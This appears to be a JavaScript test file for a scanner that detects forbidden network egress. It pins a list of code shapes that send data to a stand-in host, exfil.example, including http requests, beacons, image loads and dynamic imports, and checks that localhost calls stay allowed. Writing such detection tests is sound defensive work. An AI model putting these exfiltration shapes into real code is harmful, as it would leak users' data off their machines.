import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import test from 'node:test'
import { fileURLToPath } from 'node:url'
import {
  DEFAULT_EGRESS_SCAN_PATHS,
  discoverForbiddenEgressScanFiles,
  forbiddenEgressFindingsForText,
} from '../src/egress/forbidden-egress.mjs'

const ROOT = fileURLToPath(new URL('..', import.meta.url))

// An external audit probed the checker with 15 realistic egress shapes and 10
// passed undetected. Every shape from that probe list is pinned here so the
// detection surface can only widen deliberately.
// @atelier-egress-allow-test-fixture
const MUST_CATCH = [
  ["https.get('https://exfil.example/x', cb)", 'non-localhost-http-request'],
  ["http.get('http://exfil.example/x', cb)", 'non-localhost-http-request'],
  ["const s = http2.connect('https://exfil.example')", 'non-localhost-http-request'],
  ["const mod = await import('https://exfil.example/mod.mjs')", 'dynamic-import-egress'],
  ["navigator.sendBeacon('https://exfil.example/t', data)", 'beacon-egress'],
  ["new EventSource('https://exfil.example/stream')", 'beacon-egress'],
  ["const i = new Image(); i.src = 'https://exfil.example/p.gif'", 'browser-request-egress'],
  ["const x = new XMLHttpRequest(); x.open('GET', 'https://exfil.example')", 'browser-request-egress'],
  ["import { request } from 'undici'", 'http-client-import'],
  ['"style-src \'self\' https://fonts.exfil.example",', 'csp-external-origin'],
  ['https.get(computedTarget, cb)', 'http-request-unresolved'],
]

// @atelier-egress-allow-test-fixture
const MUST_ALLOW = [
  "fetch('http://127.0.0.1:3014/api')",
  "https.get('http://localhost:3014/health', cb)",
  "const mod = await import('./local.mjs')",
  "const mod = await import(modulePath)",
  "import fs from 'node:fs'",
]

test('every previously-missed egress shape is now detected', () => {
  for (const [code, expectedType] of MUST_CATCH) {
    const findings = forbiddenEgressFindingsForText(code, { file: 'probe.mjs' })
    assert.ok(
      findings.some((finding) => finding.type === expectedType),
      `expected ${expectedType} for: ${code} — got ${JSON.stringify(findings.map((f) => f.type))}`
    )
  }
})

test('loopback and local module shapes stay allowed', () => {
  for (const code of MUST_ALLOW) {
    const findings = forbiddenEgressFindingsForText(code, { file: 'probe.mjs' })
    assert.deepEqual(findings, [], `unexpected finding for: ${code}`)
  }
})

test('markup files are scanned and external resource references are refused', () => {
  const findings = forbiddenEgressFindingsForText(
    '<link rel="stylesheet" href="https://fonts.exfil.example/css2?family=X">',
    { file: 'page.html' }
  )
  assert.ok(findings.some((finding) => finding.type === 'markup-external-resource'))

  const local = forbiddenEgressFindingsForText(
    '<link rel="stylesheet" href="/styles.css"><script src="./app.js"></script>',
    { file: 'page.html' }
  )
  assert.deepEqual(local, [])
})

// Eight of the eleven previous scan paths were src/ subdirectories listed as
// if top-level, so they silently scanned nothing. Every configured path must
// exist, and the discovery walk must actually reach templates and examples.
test('every default egress scan path exists in the repo', () => {
  for (const rel of DEFAULT_EGRESS_SCAN_PATHS) {
    assert.ok(fs.existsSync(path.join(ROOT, rel)), `scan path ${rel} does not exist`)
  }
})

test('the discovery walk reaches examples in the real repo', () => {
  const files = discoverForbiddenEgressScanFiles({ root: ROOT })
  const rels = files.map((file) => path.relative(ROOT, file))
  assert.ok(rels.some((rel) => rel.startsWith('examples/')), 'examples/ not scanned')
})

test('a script or page landing in any configured path is discovered', (t) => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'atelier-egress-paths-'))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  for (const rel of DEFAULT_EGRESS_SCAN_PATHS) {
    fs.mkdirSync(path.join(root, rel), { recursive: true })
    fs.writeFileSync(path.join(root, rel, 'probe.mjs'), 'export {}\n')
    fs.writeFileSync(path.join(root, rel, 'probe.html'), '<p>ok</p>\n')
  }
  const rels = discoverForbiddenEgressScanFiles({ root }).map((file) => path.relative(root, file))
  for (const rel of DEFAULT_EGRESS_SCAN_PATHS) {
    assert.ok(rels.includes(path.join(rel, 'probe.mjs')), `${rel}/probe.mjs not discovered`)
    assert.ok(rels.includes(path.join(rel, 'probe.html')), `${rel}/probe.html not discovered`)
  }
})
